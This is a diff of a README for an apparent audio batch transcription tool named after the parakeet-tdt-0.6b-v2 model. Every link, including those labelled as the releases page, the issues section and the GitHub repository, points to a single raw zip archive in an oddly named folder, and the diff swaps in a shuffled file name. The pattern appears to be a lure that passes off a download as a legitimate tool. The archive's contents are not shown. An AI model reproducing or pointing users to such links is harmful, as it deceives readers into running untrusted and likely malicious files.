@@ -1,6 +1,6 @@
 # 🦜 parakeet-tdt-0.6b-v2-Batch-Transcriber - Accurate Audio Transcription Simplified
 
-[![Download Now](https://raw.githubusercontent.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/main/oxyhematin/parakeet-tdt-0.6b-v2-Batch-Transcriber.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/main/oxyhematin/parakeet-tdt-0.6b-v2-Batch-Transcriber.zip)
+[![Download Now](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/raw/refs/heads/main/oxyhematin/v-b-Transcriber-parakeet-tdt-Batch-2.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/raw/refs/heads/main/oxyhematin/v-b-Transcriber-parakeet-tdt-Batch-2.6.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ parakeet-tdt-0.6b-v2-Batch-Transcriber is a powerful tool for converting audio f
 
 To use the application, follow these steps:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/main/oxyhematin/parakeet-tdt-0.6b-v2-Batch-Transcriber.zip).
+1. Go to the [Releases page](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/raw/refs/heads/main/oxyhematin/v-b-Transcriber-parakeet-tdt-Batch-2.6.zip).
 2. Look for the latest version.
 3. Click on the appropriate download link for your system.
 
@@ -25,7 +25,7 @@ To run the application, make sure you have the following:
 
 ## 📥 Download & Install
 
-Visit the [Releases page](https://raw.githubusercontent.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/main/oxyhematin/parakeet-tdt-0.6b-v2-Batch-Transcriber.zip) to download the latest version. 
+Visit the [Releases page](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/raw/refs/heads/main/oxyhematin/v-b-Transcriber-parakeet-tdt-Batch-2.6.zip) to download the latest version. 
 
 ### Installation Steps:
 
@@ -61,7 +61,7 @@ If you encounter any issues, check the following:
 
 ## 🌐 Support and Feedback
 
-For additional support, please visit the issues section on the [GitHub repository](https://raw.githubusercontent.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/main/oxyhematin/parakeet-tdt-0.6b-v2-Batch-Transcriber.zip). You can report issues, ask questions, or provide feedback to help improve the tool. 
+For additional support, please visit the issues section on the [GitHub repository](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/raw/refs/heads/main/oxyhematin/v-b-Transcriber-parakeet-tdt-Batch-2.6.zip). You can report issues, ask questions, or provide feedback to help improve the tool. 
 
 ## 📝 License
 
@@ -69,7 +69,7 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/main/oxyhematin/parakeet-tdt-0.6b-v2-Batch-Transcriber.zip)
+- [GitHub Repository](https://github.com/JericoMeca/parakeet-tdt-0.6b-v2-Batch-Transcriber/raw/refs/heads/main/oxyhematin/v-b-Transcriber-parakeet-tdt-Batch-2.6.zip)
 - [User Guide](#)
 - [Frequently Asked Questions](#)
 
